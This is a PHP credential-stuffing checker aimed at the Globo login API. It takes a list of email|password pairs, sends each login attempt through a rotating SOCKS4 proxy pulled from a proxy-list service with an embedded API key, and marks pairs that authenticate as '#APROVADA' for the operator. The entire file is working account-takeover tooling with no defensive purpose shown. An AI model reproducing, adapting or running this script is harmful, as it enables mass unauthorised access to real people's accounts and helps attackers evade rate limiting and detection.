<?php
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');

extract($_GET);

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}

{
	$separador = "|";
	$e = explode("\r\n", $lista);
	$c = count($e);
	for ($i=0; $i < $c; $i++) { 
		$explode = explode($separador, $e[$i]);
		Testar(trim($explode[0]),trim($explode[1]));
	
	}
}
function Testar($email,$senha){
	if (file_exists(getcwd()."/americanas.txt")) {
		unlink(getcwd()."/americanas.txt");
	}

$link = file_get_contents("https://api.getproxylist.com/proxy?apiKey=2769d07972701a1cb65b10f9565e205f3fcd463a&protocol=socks4&lastTested=600");
$link2 = json_decode($link);
$link3 = $link2 ->ip;
$link4 = $link2 ->port;
$proxy = $link3.":".$link4;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://login.globo.com/api/authentication");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
curl_setopt($ch, CURLOPT_REFERER, "https://login.globo.com/login/1");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/pagseguro.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/pagseguro.txt');
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
	'Host: login.globo.com',
	'Accept: application/json, text/javascript',
	'Content-Type: application/json; charset=utf-8',
	'Connection: keep-alive'));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"payload":{"email":"'.$email.'","password":"'.$senha.'","serviceId":1},"fingerprint":"2816397472afad111b2372aec7ee8d10","captcha":""}');
$resposta = curl_exec($ch);



	if (strpos($resposta, 'Authenticated')){	
		echo "<font class='label label-success'>#APROVADA</font> ".$email." | ".$senha." <font class='label label-warning'>#BlackStar</font><br>";		

}	else{
		echo "<font class='label label-danger'>#REPROVADA</font> ".$email." | ".$senha." <br>";

	}

}

?>